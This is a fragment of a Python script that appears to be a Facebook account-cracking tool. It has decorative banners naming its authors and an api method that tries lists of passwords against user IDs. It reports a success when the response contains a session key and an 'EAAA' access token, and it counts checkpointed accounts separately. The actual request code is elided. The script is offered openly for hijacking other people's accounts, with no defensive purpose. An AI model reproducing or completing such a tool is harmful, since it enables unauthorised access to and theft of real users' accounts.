...
❤ALI HERE X HANI HERE ❤
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : 😈itzz hani mlss😈
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB LIFELINE : 💔
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mSUKOON  : 😍BRO X SIS😍
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : 🤣JALTY Q HO BEHN HAI MERE🤣
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [HANI] : %s/%s -> \033[0;92m [ HANI-OK:%s ]- \033[0;91m[HANI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [HANI-OK] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/dadabhai.arslanshafiq ")
		print(" [*] Instagram : Single hn yr")
		print(" [*] YouTube   : non user")
		exit(" [*] GitHub    : Q g")
	else:
		Main()
